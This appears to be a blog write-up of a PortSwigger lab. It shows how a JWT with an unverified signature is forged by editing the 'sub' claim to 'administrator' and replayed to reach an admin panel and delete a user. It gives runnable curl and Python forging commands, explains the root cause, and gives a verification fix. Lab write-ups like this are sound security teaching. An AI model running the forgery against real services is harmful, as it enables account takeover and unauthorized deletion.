---
layout: post
title: "PortSwigger: JWT Authentication Bypass via Unverified Signature"
date: 2027-10-19 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, JWT]
tags: [portswigger, jwt, authentication-bypass, access-control, cwe-347]
---

A JWT is `header.payload.signature`. The signature is the *only* thing stopping you from rewriting the payload — it's a cryptographic seal the server is meant to check on every request. This lab's server never checks it. It decodes the token and trusts whatever the payload claims. So we change one field — `sub` from our own username to `administrator` — leave the now-worthless signature exactly where it is, and the server lets us into the admin panel. No key, no secret, no signing. Just an edit. This is [CWE-347](https://cwe.mitre.org/data/definitions/347.html), Improper Verification of Cryptographic Signature.

## Overview

After logging in as `wiener:peter`, the app hands us a `session` cookie that is a JWT. Decoding the three dot-separated parts:

```
header  = {"kid":"...","alg":"RS256"}
payload = {"iss":"portswigger","exp":...,"sub":"wiener"}
```

The `sub` (subject) claim is the username the server uses for authorization. If we can change it to `administrator`, we *are* the administrator — provided the server doesn't notice the signature no longer matches. It doesn't.

## Step 1 — Log in and grab the token

```bash
CSRF=$(curl -sk -c cookies.txt https://TARGET/login | grep -o 'name="csrf" value="[^"]*"' | sed 's/.*value="//;s/"//')
curl -sk -b cookies.txt -c cookies.txt https://TARGET/login \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode "username=wiener" \
  --data-urlencode "password=peter" -o /dev/null -w "%{http_code}\n"
# 302  <- the redirect itself proves the password was correct
```

The `session` cookie written to `cookies.txt` is our JWT.

## Step 2 — Tamper the payload, keep the signature

We decode only the middle segment, flip `sub` to `administrator`, re-encode it, and reattach the **original** signature byte-for-byte. We never compute a new signature — that's the whole point. The server isn't going to look at it.

```bash
python3 -c "import base64,json,sys;h,p,s=sys.argv[1].split('.');\
d=json.loads(base64.urlsafe_b64decode(p+'=='*2));d['sub']='administrator';\
np=base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode();\
print(h+'.'+np+'.'+s)" "<your-session-jwt>"
```

This prints a forged token: same header, payload now says `administrator`, same old signature.

## Step 3 — Replay it

```bash
curl -sk -b "session=<forged-jwt>" https://TARGET/admin
# -> Admin panel renders (this page is admin-only)

curl -sk -b "session=<forged-jwt>" "https://TARGET/admin/delete?username=carlos"
# -> 302, carlos deleted
```

The lab flips to **Solved** the moment carlos is deleted.

## Why it worked

The server's authorization logic reads the `sub` claim and decides who you are — but it reads that claim with a decode-only call that never verifies the signature (`jwt.decode(token, options={'verify_signature': False})`, or equivalently a hand-rolled base64 split). Once verification is skipped, the seal is decorative. Editing the payload costs nothing because nothing ever checks that the signature still matches it.

This is the *purest* JWT bug, and worth contrasting with its noisier cousins:

- **`alg: none`** — you strip the signature entirely and announce the token is unsigned. Here the structure is untouched; we keep `RS256` and keep a (broken) signature.
- **Leaked HMAC secret** — you crack or read the signing key and produce a genuinely valid signature. Here we need no key at all.
- **JWKS injection / `kid` tricks** — you point the verifier at a key you control. Here the verifier isn't verifying anything to point.

All three of those involve a signing step. This one doesn't — it only works *because* signing is irrelevant to a server that never verifies.

## The fix

Verify the signature against the issuer's key **before** trusting any claim, and pin the algorithm so an attacker can't downgrade it:

```python
payload = jwt.decode(token, public_key, algorithms=['RS256'])   # verifies + pins alg
```

- Never use `jwt.decode(... verify_signature=False)` (or a raw base64 split) in an authentication path.
- Reject the request on any verification failure — never fall through to the decoded payload.
- Never ship a development "skip verification" toggle to production.
